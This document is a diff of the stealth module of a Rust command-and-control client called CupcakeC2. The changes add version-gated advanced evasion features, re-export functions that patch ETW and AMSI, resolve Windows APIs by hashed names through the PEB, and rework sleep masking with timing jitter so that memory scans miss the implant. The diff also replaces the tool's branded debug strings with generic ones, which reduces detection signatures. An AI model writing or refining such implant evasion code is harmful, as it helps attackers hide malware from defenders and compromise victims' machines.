@@ -1,5 +1,9 @@
 // Client/core/src/stealth/mod.rs
 // CupcakeC2 V3 Stealth Subsystem
+//
+// Two-layer architecture:
+// - Layer A (default): version-agnostic PEB/syscall helpers (peb, stack, integrity helpers, version)
+// - Layer B (feature = "stealth-adv"): version-sensitive enhancements with runtime gates + fallback
 
 #[cfg(windows)]
 pub mod peb;
@@ -9,11 +13,22 @@ pub mod integrity;
 pub mod mask;
 #[cfg(windows)]
 pub mod stack;
+#[cfg(windows)]
+pub mod version;
+
+/// Version-sensitive enhancements (NtCreateUserProcess, future unhook/manual-map).
+#[cfg(all(windows, feature = "stealth-adv"))]
+pub mod adv;
 
 #[cfg(windows)]
 pub use peb::{get_module_base, get_api_addr};
 #[cfg(windows)]
 pub use integrity::{patch_etw, patch_amsi};
+#[cfg(windows)]
+pub use version::{
+    get_windows_version, is_supported_for_nt_create_user_process, WindowsVersion,
+    NT_CREATE_USER_PROCESS_MIN_BUILD,
+};
 
 
 pub const fn hash_module_name(s: &[u8]) -> u32 {
@@ -73,7 +88,7 @@ pub fn setup_diagnostic_console() {
         // 2. Fallback diagnostic: OutputDebugStringA (View with DebugView)
         if let Some(ods_addr) = get_api_addr(h_kernel32, hash_api_name(b"OutputDebugStringA")) {
             let ods: unsafe extern "system" fn(*const u8) = std::mem::transmute(ods_addr);
-            ods(b"CupcakeC2: Diagnostic Console Requested\n\0".as_ptr());
+            ods(b"diag: console requested\n\0".as_ptr());
         }
         
         // 3. Re-open standard streams to the console
@@ -92,7 +107,7 @@ pub fn setup_diagnostic_console() {
                     // Direct confirmation write
                     if let Some(write_addr) = get_api_addr(h_kernel32, hash_api_name(b"WriteConsoleA")) {
                         let write_console: unsafe extern "system" fn(usize, *const u8, u32, *mut u32, *mut ()) -> i32 = std::mem::transmute(write_addr);
-                        let msg = b"\r\n========================================\r\n[!] CUPCAKE C2 DIAGNOSTIC CONSOLE\r\n[+] Console Allocated Successfully\r\n========================================\r\n\r\n";
+                        let msg = b"\r\n[diag] console ready\r\n";
                         let mut written = 0;
                         write_console(h_con, msg.as_ptr(), msg.len() as u32, &mut written, std::ptr::null_mut());
                     }
@@ -102,88 +117,51 @@ pub fn setup_diagnostic_console() {
     }
 }
 
+/// Sleep with optional jitter. Full heap/section XOR masking is **disabled by default**
+/// (`sleep-mask` feature) because it races with the async runtime and commonly crashes.
 pub async fn stealth_sleep(duration_ms: u32) {
-    #[cfg(windows)]
+    let jitter = if duration_ms > 10 {
+        crate::utils::random_range(0, duration_ms / 10) as u64
+    } else {
+        0
+    };
+    let actual_sleep = duration_ms as u64 + jitter;
+
+    #[cfg(all(feature = "sleep-mask", windows, target_arch = "x86_64"))]
     {
-        crate::utils::db_print(&format!("[Cupcake] stealth_sleep() called. Temporarily using tokio::time::sleep for {} ms", duration_ms));
-
-        // 🛡️ Phase 2: Sleep Mask Implementation
-        // Before sleep: XOR encrypt memory regions to protect against memory dumps
-        // After sleep: Restore original memory
-
-        #[cfg(target_arch = "x86_64")]
-        {
-            // Apply sleep mask before sleeping
-            let mask_key = apply_sleep_mask();
-
-            // Sleep with jitter
-            let jitter = crate::utils::random_range(0, duration_ms / 10) as u64;
-            let actual_sleep = duration_ms as u64 + jitter;
-            tokio::time::sleep(tokio::time::Duration::from_millis(actual_sleep)).await;
-
-            // Restore memory after sleep
-            restore_sleep_mask(mask_key);
-        }
-
-        #[cfg(not(target_arch = "x86_64"))]
-        {
-            tokio::time::sleep(tokio::time::Duration::from_millis(duration_ms as u64)).await;
-        }
+        // Only mask caller-owned PE data/rdata sections — NEVER the process heap.
+        let mask_key = apply_sleep_mask();
+        tokio::time::sleep(tokio::time::Duration::from_millis(actual_sleep)).await;
+        restore_sleep_mask(mask_key);
+        return;
     }
-    #[cfg(not(windows))]
+
+    #[cfg(not(all(feature = "sleep-mask", windows, target_arch = "x86_64")))]
     {
-        tokio::time::sleep(tokio::time::Duration::from_millis(duration_ms as u64)).await;
+        tokio::time::sleep(tokio::time::Duration::from_millis(actual_sleep)).await;
     }
 }
 
-/// 🛡️ Phase 2: Sleep Mask - XOR encrypt sensitive memory before sleep
-/// This prevents memory dumps from revealing agent configuration, keys, and data
-#[cfg(all(windows, target_arch = "x86_64"))]
+/// Optional sleep mask (feature `sleep-mask`): XOR PE .data/.rdata only.
+/// Full-heap masking was removed — it corrupts live allocations (tokio, TLS, buffers).
+#[cfg(all(feature = "sleep-mask", windows, target_arch = "x86_64"))]
 fn apply_sleep_mask() -> u64 {
     unsafe {
-        // Generate random XOR key (8 bytes for x64)
         let xor_key = crate::utils::next_u32() as u64 | ((crate::utils::next_u32() as u64) << 32);
         let key_bytes: [u8; 8] = std::mem::transmute(xor_key);
-
-        // Phase 2: Mask three regions using mask.rs functions
-        // 1. Mask the default process heap (heap allocated data)
-        crate::stealth::mask::mask_default_heap(&key_bytes);
-
-        // 2. Mask PE .data and .rdata sections (static data, config keys)
+        // Do NOT call mask_default_heap — heap XOR is unsafe with concurrent threads.
         crate::stealth::mask::mask_pe_sections(&key_bytes);
-
-        crate::utils::db_print(&format!(
-            "[Cupcake] Sleep mask applied with key 0x{:016X}",
-            xor_key
-        ));
-
         xor_key
     }
 }
 
-/// 🛡️ Phase 2: Restore memory after sleep (XOR is symmetric)
-#[cfg(all(windows, target_arch = "x86_64"))]
+#[cfg(all(feature = "sleep-mask", windows, target_arch = "x86_64"))]
 fn restore_sleep_mask(mask_key: u64) {
     unsafe {
-        // XOR is symmetric: applying the same key again restores
         let key_bytes: [u8; 8] = std::mem::transmute(mask_key);
-
-        // Reverse the mask operations
         crate::stealth::mask::mask_pe_sections(&key_bytes);
-        crate::stealth::mask::mask_default_heap(&key_bytes);
-
-        crate::utils::db_print(&format!(
-            "[Cupcake] Sleep mask restored with key 0x{:016X}",
-            mask_key
-        ));
     }
 }
-
-#[cfg(not(all(windows, target_arch = "x86_64")))]
-fn apply_sleep_mask() -> u64 { 0 }
-
-#[cfg(not(all(windows, target_arch = "x86_64")))]
-fn restore_sleep_mask(_mask_key: u64) {}
 
 pub fn spoof_process_name(_name: &str) {
     #[cfg(target_os = "linux")]
